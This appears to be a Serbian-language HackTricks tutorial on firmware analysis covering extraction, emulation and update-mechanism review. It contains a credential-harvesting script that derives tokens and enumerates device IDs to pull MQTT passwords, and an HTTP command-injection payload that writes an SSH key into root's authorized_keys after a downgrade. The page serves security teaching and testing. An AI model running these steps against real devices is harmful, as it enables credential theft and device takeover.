# Analiza firmvera

{{#include ../../banners/hacktricks-training.md}}

## **Uvod**

### Povezani resursi


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Firmver je ključan softver koji omogućava uređajima da pravilno funkcionišu tako što upravlja i olakšava komunikaciju između hardverskih komponenti i softvera sa kojim korisnici interaguju. Čuva se u trajnoj memoriji, što omogućava uređaju pristup vitalnim instrukcijama od trenutka uključivanja, vodeći do pokretanja operativnog sistema. Ispitivanje i potencijalna modifikacija firmvera su kritični koraci u identifikaciji bezbednosnih ranjivosti.

## **Prikupljanje informacija**

**Prikupljanje informacija** je ključni početni korak za razumevanje sastava uređaja i tehnologija koje koristi. Ovaj proces podrazumeva prikupljanje podataka o:

- CPU arhitekturi i operativnom sistemu koji koristi
- specifičnostima bootloader-a
- rasporedu hardvera i datasheet-ovima
- metrikama koda i lokacijama izvornog koda
- spoljnim bibliotekama i tipovima licenci
- istorijama ažuriranja i regulatornim sertifikatima
- arhitektonskim i tok-dijagramima
- bezbednosnim procenama i identifikovanim ranjivostima

Za ovu svrhu, alati za open-source intelligence (OSINT) su neprocenjivi, kao i analiza svih dostupnih open-source softverskih komponenti kroz manuelne i automatizovane procese pregleda. Alati kao što su [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu statičku analizu koja se može iskoristiti za pronalaženje potencijalnih problema.

## **Preuzimanje firmvera**

Dobijanje firmvera može se izvesti na više načina, svaki sa različitim nivoom složenosti:

- **Direktno** od izvora (developers, proizvođači)
- **Sastavljanje** iz priloženih uputstava
- **Preuzimanje** sa zvaničnih support sajtova
- Korišćenjem **Google dork** upita za pronalaženje hostovanih firmware fajlova
- Direktnim pristupom **cloud storage**, alatima kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanjem **updates** putem man-in-the-middle tehnika
- **Ekstrakcijom** sa uređaja preko konekcija kao što su **UART**, **JTAG** ili **PICit**
- **Sniffing-om** zahteva za ažuriranje unutar komunikacije uređaja
- Identifikovanjem i korišćenjem **hardcoded update endpoints**
- **Dumpovanjem** iz bootloader-a ili mreže
- **Uklanjanjem i čitanjem** memorijskog čipa, kada ništa drugo ne uspe, koristeći odgovarajuće hardverske alate

## Analiza firmvera

Sada kada imate firmver, potrebno je izvući informacije o njemu da biste znali kako da ga tretirate. Različiti alati koje možete koristiti za to:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Ako ne nađete mnogo sa tim alatima, proverite **entropy** slike sa `binwalk -E <bin>` — ako je entropy nizak, verovatno nije encrypted. Ako je entropy visok, verovatno je encrypted (ili na neki način compressed).

Pored toga, možete koristiti ove alate da izvučete **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) da pregledate fajl.

### Getting the Filesystem

Sa prethodno pomenutim alatima kao `binwalk -ev <bin>` trebalo bi da ste uspeli da **extract the filesystem**.\
Binwalk obično izdvaja to unutar **folder named as the filesystem type**, koji obično bude jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Ponekad binwalk neće imati **the magic byte of the filesystem in its signatures**. U tim slučajevima, koristite binwalk da **find the offset of the filesystem and carve the compressed filesystem** iz binarnog fajla i **manually extract** the filesystem prema njegovom tipu koristeći korake ispod.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Pokrenite sledeću dd komandu za carving the Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativno, može se pokrenuti i sledeća komanda.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Za squashfs (korišćeno u gornjem primeru)

`$ unsquashfs dir.squashfs`

Fajlovi će se potom nalaziti u direktorijumu "`squashfs-root`".

- Za CPIO arhive

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Za jffs2 fajl-sisteme

`$ jefferson rootfsfile.jffs2`

- Za ubifs fajl-sisteme sa NAND flash-om

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza firmvera

Kada se firmware dobije, neophodno ga je rastaviti kako bi se razumela njegova struktura i potencijalne ranjivosti. Ovaj proces uključuje upotrebu različitih alata za analizu i izdvajanje korisnih podataka iz slike firmvera.

### Početni alati za analizu

Daje se skup komandi za početnu inspekciju binarnog fajla (nazvanog `<bin>`). Ove komande pomažu pri identifikaciji tipova fajlova, izvlačenju stringova, analizi binarnih podataka i razumevanju particija i detalja fajl-sistema:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Da bi se procenio status enkripcije slike, proverava se **entropija** pomoću `binwalk -E <bin>`. Niska entropija ukazuje na odsustvo enkripcije, dok visoka entropija može ukazivati na enkripciju ili kompresiju.

Za izdvajanje **ugrađenih fajlova**, preporučuju se alati i resursi kao što su dokumentacija **file-data-carving-recovery-tools** i **binvis.io** za inspekciju fajlova.

### Izdvajanje filesystem-a

Korišćenjem `binwalk -ev <bin>`, obično se može izdvojiti fajl-sistem, često u direktorijum imenovan po tipu fajl-sistema (npr. squashfs, ubifs). Međutim, kada **binwalk** ne uspe da prepozna tip fajl-sistema zbog nedostajućih magic bytes, neophodno je ručno izdvajanje. To uključuje korišćenje `binwalk` za pronalaženje offset-a fajl-sistema, praćeno `dd` komandom za izdvajanje fajl-sistema:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Nakon toga, u zavisnosti od tipa filesystem-a (npr. squashfs, cpio, jffs2, ubifs), koriste se različite komande za ručno izdvajanje sadržaja.

### Analiza fajl sistema

Sa izdvojenim filesystem-om počinje pretraga sigurnosnih propusta. Pažnja se posvećuje insecure network daemons, hardcoded credentials, API endpoints, update server funkcionalnostima, nekompajliranom kodu, startup skriptama i kompilovanim binarnim fajlovima za offline analizu.

**Ključna mesta** i **stavke** za pregled uključuju:

- **etc/shadow** i **etc/passwd** za korisničke kredencijale
- SSL sertifikati i ključevi u **etc/ssl**
- Konfiguracioni i skript fajlovi za potencijalne ranjivosti
- Ugrađeni binarni fajlovi za dalju analizu
- Uobičajeni IoT device web serveri i binarni fajlovi

Nekoliko alata pomaže u otkrivanju osetljivih informacija i ranjivosti unutar filesystem-a:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu firmware analizu
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), i [**EMBA**](https://github.com/e-m-b-a/emba) za static i dynamic analizu

### Bezbednosne provere kompilovanih binarnih fajlova

I izvorni kod i kompilovani binarni fajlovi pronađeni u filesystem-u moraju se detaljno ispitati zbog ranjivosti. Alati poput **checksec.sh** za Unix binarne i **PESecurity** za Windows binarne pomažu u identifikaciji nezaštićenih binarnih fajlova koji bi mogli biti iskorišćeni.

## Prikupljanje cloud config i MQTT kredencijala putem izvedenih URL tokena

Mnogi IoT hubovi preuzimaju per-device konfiguraciju sa cloud endpoint-a koji izgleda ovako:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Tokom firmware analize možete otkriti da je <token> izveden lokalno iz deviceId koristeći hardkodovan tajni ključ, na primer:

- token = MD5( deviceId || STATIC_KEY ) i predstavljen kao heksadecimalni niz velikih slova

Ovaj dizajn omogućava svakome ko otkrije deviceId i STATIC_KEY da rekonstruše URL i povuče cloud config, često otkrivajući nešifrovane MQTT kredencijale i prefikse topika.

Praktičan tok rada:

1) Izvucite deviceId iz UART boot logova

- Povežite 3.3V UART adapter (TX/RX/GND) i snimite logove:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Potražite linije koje ispisuju obrazac URL-a cloud config i adresu brokera, na пример:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Oporavite STATIC_KEY i algoritam tokena iz firmware-a

- Učitajte binarne fajlove u Ghidra/radare2 i potražite putanju konfiguracije ("/pf/") ili upotrebu MD5.
- Potvrdite algoritam (npr. MD5(deviceId||STATIC_KEY)).
- Izvedite token u Bash i pretvorite digest u velika slova:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Prikupljanje cloud config i MQTT credentials

- Sastavi URL i povuci JSON koristeći curl; parsiraj sa jq da izdvojiš secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Zloupotrebite plaintext MQTT i slabe topic ACLs (ako postoje)

- Koristite obnovljene kredencijale da se pretplatite na maintenance topics i pratite osetljive događaje:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumeriši predvidljive device IDs (na skali, uz autorizaciju)

- Mnogi ekosistemi ugrađuju vendor OUI/product/type bytes, praćene sekvencijalnim sufiksom.
- Možeš iterirati kandidatne device ID-e, izvesti tokens i programatski dohvatiti configs:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Napomene
- Uvek dobijte izričitu autorizaciju pre nego što pokušate mass enumeration.
- Kad je moguće, preferirajte emulation ili static analysis da biste povratili secrets bez modifikovanja ciljnog hardvera.

Proces emulacije firmware-a omogućava **dynamic analysis** bilo operacije uređaja ili pojedinačnog programa. Ovaj pristup može naići na izazove zbog hardverskih ili arhitekturnih zavisnosti, ali premeštanje root filesystem-a ili specifičnih binarnih fajlova na uređaj sa odgovarajućom arhitekturom i endianness-om, kao što je Raspberry Pi, ili na pre-built virtual machine, može olakšati dalja testiranja.

### Emulacija pojedinačnih binarnih fajlova

Za ispitivanje pojedinačnih programa, ključno je identifikovati endianness i CPU architecture programa.

#### Primer za MIPS arhitekturu

Za emulaciju MIPS binarnog fajla, može se koristiti sledeća komanda:
```bash
file ./squashfs-root/bin/busybox
```
I da instalirate neophodne alate za emulaciju:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Za MIPS (big-endian), `qemu-mips` se koristi, a za little-endian binarne fajlove birate `qemu-mipsel`.

#### Emulacija ARM arhitekture

Za ARM binarne fajlove postupak je sličan — koristi se emulator `qemu-arm`.

### Emulacija celog sistema

Alati kao [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugi, olakšavaju punu emulaciju firmvera, automatizuju proces i pomažu u dinamičkoj analizi.

## Dinamička analiza u praksi

U ovoj fazi koristi se stvarno ili emulirano okruženje uređaja za analizu. Bitno je zadržati shell pristup OS-u i fajl-sistemu. Emulacija možda neće savršeno oponašati interakcije sa hardverom, pa je ponekad potrebno restartovati emulaciju. Analiza treba ponovo pregledati fajl-sistem, iskoristiti izložene web-stranice i mrežne servise i istražiti ranjivosti bootloader-a. Testovi integriteta firmvera su kritični za identifikovanje mogućih backdoor ranjivosti.

## Tehnike runtime analize

Runtime analiza podrazumeva interakciju sa procesom ili binarnim fajlom u njegovom operativnom okruženju, koristeći alate poput gdb-multiarch, Frida i Ghidra za postavljanje breakpoint-a i identifikovanje ranjivosti kroz fuzzing i druge tehnike.

## Eksploatacija binara i Proof-of-Concept

Razvijanje PoC-a za identifikovane ranjivosti zahteva duboko razumevanje ciljne arhitekture i programiranje u jezicima nižeg nivoa. Runtime zaštite binarnih fajlova u ugrađenim sistemima su retke, ali kada postoje, tehnike poput Return Oriented Programming (ROP) mogu biti neophodne.

## Pripremljeni operativni sistemi za analizu firmvera

Operativni sistemi kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) pružaju prekonfigurisana okruženja za testiranje bezbednosti firmvera, opremljena neophodnim alatima.

## Pripremljeni OS-ovi za analizu firmvera

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distro namenjen da vam pomogne pri security assessment-u i penetration testing-u Internet of Things (IoT) uređaja. Štedi vreme time što pruža prekonfigurisano okruženje sa svim potrebnim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operativni sistem za testiranje bezbednosti ugrađenih sistema zasnovan na Ubuntu 18.04, unapred učitan sa alatima za testiranje bezbednosti firmvera.

## Napadi downgrade-a firmvera & nesigurni mehanizmi ažuriranja

Čak i kada vendor primeni kriptografske provere potpisa za slike firmvera, **zaštita od version rollback-a (downgrade) često je izostavljena**. Kada boot- ili recovery-loader samo verifikuje potpis ugrađenim javnim ključem, ali ne upoređuje *verziju* (ili monotoni brojač) slike koja se flešuje, napadač može legitimno instalirati **stariju, ranjivu verziju firmvera koja i dalje ima važeći potpis** i tako ponovo uvesti ranjivosti koje su već bile ispravljene.

Tipičan tok napada:

1. **Obtain an older signed image**
   * Preuzeti ga sa javnog download portala proizvođača, CDN-a ili sajta za podršku.
   * Ekstrahovati ga iz pratećih mobilnih/desktop aplikacija (npr. unutar Android APK-a pod `assets/firmware/`).
   * Preuzeti ga iz trećepartnih repozitorijuma kao što su VirusTotal, Internet arhive, forumi, itd.
2. **Upload or serve the image to the device** via any exposed update channel:
   * Web UI, mobile-app API, USB, TFTP, MQTT, etc.
   * Mnogi consumer IoT uređaji izlažu *unauthenticated* HTTP(S) endpoint-e koji prihvataju Base64-encoded firmware blob-ove, dekodiraju ih server-side i pokreću recovery/upgrade.
3. Nakon downgrade-a, iskoristite ranjivost koja je zakrpljena u novijem izdanju (na primer filter za command-injection koji je dodat kasnije).
4. Opcionalno vratite najnoviju sliku ili onemogućite update-e da biste izbegli detekciju nakon sticanja persistencije.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
U ranjivom (vraćenom na stariju verziju) firmveru, parametar `md5` se direktno konkatenira u shell komandu bez sanitizacije, što omogućava injekciju proizvoljnih komandi (ovde – omogućavanje pristupa root preko SSH korišćenjem ključeva). Kasnije verzije firmvera su uvele osnovni filter karaktera, ali odsustvo zaštite od vraćanja na stariju verziju čini zakrpu bezpredmetnom.

### Extracting Firmware From Mobile Apps

Mnogi proizvođači uključuju kompletne slike firmvera u svoje prateće mobilne aplikacije kako bi aplikacija mogla da ažurira uređaj preko Bluetooth/Wi‑Fi. Ovi paketi se obično čuvaju nešifrovani u APK/APEX pod putanjama kao što su `assets/fw/` ili `res/raw/`. Alati poput `apktool`, `ghidra`, ili čak običnog `unzip` omogućavaju vam da izvučete potpisane slike bez potrebe da dirate fizički hardver.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Kontrolna lista za procenu logike ažuriranja

* Da li je transport/autentifikacija *update endpoint*-a adekvatno zaštićena (TLS + authentication)?
* Da li uređaj upoređuje **brojeve verzija** ili **monotoni anti-rollback brojač** pre flashovanja?
* Da li je image verifikovan unutar secure boot chain-a (npr. potpisi provereni u ROM kodu)?
* Da li userland kod vrši dodatne sanity provere (npr. dozvoljena mapa particija, model uređaja)?
* Da li *partial* ili *backup* update tokovi ponovo koriste istu logiku validacije?

> 💡  Ako bilo šta od navedenog nedostaje, platforma je verovatno podložna rollback napadima.

## Ranljiv firmware za vežbu

Za vežbanje otkrivanja ranjivosti u firmware-u, koristite sledeće ranjive firmware projekte kao polaznu tačku.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Reference

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Trening i sertifikati

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
